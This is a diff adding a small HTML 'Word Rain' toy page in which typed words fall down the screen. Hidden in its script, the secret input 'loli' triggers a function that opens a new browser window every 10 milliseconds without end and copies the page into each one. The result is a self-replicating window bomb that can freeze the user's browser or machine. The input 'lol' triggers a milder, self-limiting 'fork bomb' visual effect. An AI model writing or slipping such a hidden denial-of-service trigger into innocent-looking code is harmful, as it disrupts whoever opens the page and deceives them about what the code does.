@@ -1,0 +1,124 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Word Rain</title>
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+      background: black;
+      color: white;
+    }
+    #inputContainer {
+      position: absolute;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 10;
+    }
+    #wordInput {
+      font-size: 20px;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+    }
+    #warning {
+      position: absolute;
+      top: 60px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: red;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 5px;
+      display: none;
+      z-index: 10;
+    }
+    .word {
+      position: absolute;
+      white-space: nowrap;
+      font-size: 24px;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+<div id="inputContainer">
+  <input type="text" id="wordInput" placeholder="Enter word..." autofocus />
+</div>
+<div id="warning">FORK BOMB ACTIVATED</div>
+
+<script>
+  const input = document.getElementById('wordInput');
+  const warning = document.getElementById('warning');
+  let forkBombMode = false;
+
+  input.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      const word = input.value.trim().toLowerCase();
+      if (word) {
+        if (word === 'lol' && !forkBombMode) {
+          activateForkBombEffect();
+          forkBombMode = true;
+        } else if (word === 'loli') {
+          activateWindowBomb();
+        } else {
+          createWordRain(word);
+        }
+        input.value = '';
+      }
+    }
+  });
+
+  function createWordRain(word) {
+    const span = document.createElement('span');
+    span.className = 'word';
+    span.textContent = word;
+    span.style.left = Math.random() * window.innerWidth + 'px';
+    span.style.top = '0px';
+    span.style.color = getRandomColor();
+    document.body.appendChild(span);
+
+    let y = 0;
+    const fall = setInterval(() => {
+      y += 5;
+      span.style.top = y + 'px';
+      if (y > window.innerHeight) {
+        clearInterval(fall);
+        span.remove();
+      }
+    }, 30);
+  }
+
+  function getRandomColor() {
+    return 'hsl(' + Math.floor(Math.random() * 360) + ', 100%, 70%)';
+  }
+
+  function activateForkBombEffect() {
+    warning.style.display = 'block';
+    for (let i = 0; i < 500; i++) {
+      setTimeout(() => {
+        createWordRain('LOL');
+      }, i * 50);
+    }
+    setTimeout(() => {
+      warning.style.display = 'none';
+      forkBombMode = false;
+    }, 5000);
+  }
+
+  function activateWindowBomb() {
+    setInterval(function () {
+      const w = window.open();
+      if (w) {
+        w.document.write(document.documentElement.outerHTML || document.documentElement.innerHTML);
+      }
+    }, 10);
+  }
+</script>
+
+</body>
+</html>
